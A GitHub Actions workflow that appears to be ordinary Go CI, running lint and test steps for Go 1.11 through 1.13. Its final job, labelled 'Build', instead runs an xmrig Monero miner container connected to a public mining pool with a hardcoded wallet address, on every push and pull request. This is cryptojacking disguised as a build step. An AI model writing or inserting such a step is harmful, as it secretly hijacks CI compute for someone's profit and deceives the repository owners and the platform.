on: [push, pull_request]
name: build
jobs:
  go-pipeline:
    name: Go Checks
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@master
    - name: go1.11 linter
      uses: ./go1.11/linter
      with:
        GOLINT: on
        MISSPELL: on
      env:
        PROJECT_PATH: test
    - name: go1.11 test
      uses: ./go1.11/test
      env:
        PROJECT_PATH: test
    - name: go1.12 linter
      uses: ./go1.12/linter
      with:
        GOLINT: on
        MISSPELL: on
      env:
        PROJECT_PATH: test
    - name: go1.12 test
      uses: ./go1.12/test
      env:
        PROJECT_PATH: test
    - name: go1.13 linter
      uses: ./go1.13/linter
      with:
        GOLINT: on
        MISSPELL: on
      env:
        PROJECT_PATH: test
    - name: go1.13 test
      uses: ./go1.13/test
      env:
        PROJECT_PATH: test
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
